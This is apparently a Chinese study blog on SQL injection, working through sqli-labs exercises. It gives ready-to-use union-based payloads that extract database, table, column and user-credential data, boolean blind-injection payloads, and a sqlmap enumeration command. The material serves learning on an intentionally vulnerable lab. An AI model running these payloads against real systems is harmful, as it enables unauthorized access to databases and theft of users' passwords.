什么是SQL注入

sql注入，是针对DBMS的攻击，由于后端使用了过时的架构或者不安全的数据库连接方法导致攻击者在提交查询参数时附带的预期外的SQL语句被DBMS执行。

这里首先要理解DBMS和DB的区别：

DBMS，即数据库管理系统，是用来管理数据库的`软件`，如 MySql, Oracle, Access等

DB，数据库，是`文件的集合`。

因此，除了网站编写人员对于处理与数据库管理系统的代码影响之外，不同的数据库管理系统、不同的版本，对于SQL语句检查的方法、严格程度不同，也会对sql注入方法产生影响，比如Oracle检查的最严格，Mysql的相对不严格。

而我们后面用到的sqli-labs的存在注入点的PHP脚本都是和MySql交互的，所以我们后面的注入方法是针对于MySQL数据库管理系统的。

SQL注入的危害

以前对于危害虽有耳闻，但不甚理解，在昨晚自己编写了bool 盲注 SQL注入半自动化脚本后，今天在DaiWei的服务器上做第五题，发现除了可以爆出题目所在的当前数据库名之外，MySql管理的其他所有数据库也可以被爆出来，瞬间就理解了危害：

就是通过一个存在SQL注入点的网页（代码），我们可以查询到数据库管理系统中所有数据库的信息，这其中必然包含了大量的用户敏感信息，所以，和一个数据库交互的脚本出了问题，会波及到该数据库所在域的所有其他数据库，这危害真实太大。

SQLi的利用思路及步骤

  1. 找到注入点

    F12，Network->clear->点击链接->发现向数据库提交记录->右键copy link address

    1. 判断注入类型——数字型、字符型

      字符型：把输入的参数当做字符处理（存在闭合符如””, ‘’, ()等）

    2. 判断闭合符

      输入单引号 报错

  1. 判断后台数据库列数

    newId=1 order by 10(二分) -> 首先检查语法正确所以用1

  2. 找到显示位

    newId=-1 union select 1,2,3,4,5

    注：-1作用：让原来查出来的不被查出来，只显出自己的查询结果（换成1试试）

  3. 查数据

    1. 库名

      newId=-1 union select 1,2,database(),4,5 double_fish

    2. 表名

      select table_name from information_schema.tables where table_schema = “库名” t_admin

      注意：==select后使用group_concat(查询内容)，实现查询结果>1条==

    3. 列名

      select column_name from information_schema.columns where table_schema = “库名” and table_name = “表名”; username, password

      技巧：==concat_ws(“–>”, username, password)==

    4. 查数据

      select username, password from double_fish.t_admin;

手注技巧

Less 1

(一) 判断注入类型

  1. id=1

  2. id=2

  3. id=2-1

由于id=2-1中的结果和id=2的结果一样，证明2-1并没有被当做表达式计算，所以是字符型。

(二) 猜解闭合符

  1. id=1’

发现页面报错，证明至少猜对了第一个闭合符，由报错信息判断，闭合符仅为一个单引号。

(三) 判断数据库列数

  1. id=1’ order by 10 %23


    此条报错说明数据库列数<10，于是使用二分法。注：%23是为了注释原查询语句后面的内容

  2. id=1’ order by 3 %23

  3. id=1’ order by 4 %23


    由6、7步知，数据库列数为3

(四) 找到显示位

  1. id=-1’ union select 1,2,3 %23


    由此可知显示位置为2和3号位，需注意，id=-1而不是1，不然会虽然查询出了两条记录，但会只显示第一条成功查询的记录，就看不到显示位的回显信息了！！

(五) 查库名

  1. id=-1’ union select 1,2,database()%23


    由此可知数据库名为security

(六) 查表名

  1. id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23


    注意这里需要用group_concat将多条查询结果连接成一条结果，显然此处最有可能藏有用户账号密码的表为”users”

(七) 查列名

  1. id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=”users”%23

(八) 查数据

  1. id=-1’ union select 1,2,group_concat(username, “–>”, password, “
    “) from security.users%23

    注：这里使用一些分隔符使得账号和口令可读性更强。

Less 2

(一) 判断注入类型

  1. id=1

  2. id=2-1

发现两次返回结果一样，证明是数字型，所以也不需要去判别闭合符，下面判断列数，找显示点，查询库名、表名、数据的步骤，以及回显结果同Less 1，这里仅给出payload

Less 3

  1. 判断注入类型

    输入2-1，发现显示页面改变了，证明是字符型（如果是数字型，会先进行运算，返回结果一样）

  2. 判断闭合符

    输入单引号，将报错内容复制出，然后去掉字符串两端的单引号就是SQL语句

    从1的左端可知，确实是已经闭合了单引号，但是右边显示圆括号，所以还需闭合圆括号

Less 4

  1. 判断是否存在注入

  2. 判断闭合符

    输入单引号，页面不变，证明未闭合

    输入双引号，得知闭合符

Less 5

盲注

  1. 盲注原理（判断闭合符）：如果是猜的闭合符正确的，两次回显内容不同，一次有一次没有，否则，都回显没有

    1’ and 1=1%23

    1’ and 1=2%23

  2. 猜数据库名

    ascii(substr(database(), ?(==猜解的字符的位置==), 1)) > ?(==猜解的字符的ascii码== )

id=1' and 1=1 and ascii(substr(database(), 1, 1)) > 114 %23

查询库名

指定库名查表名

执行命令：python sqlmap.py -u “注入点” -D 库名 –table
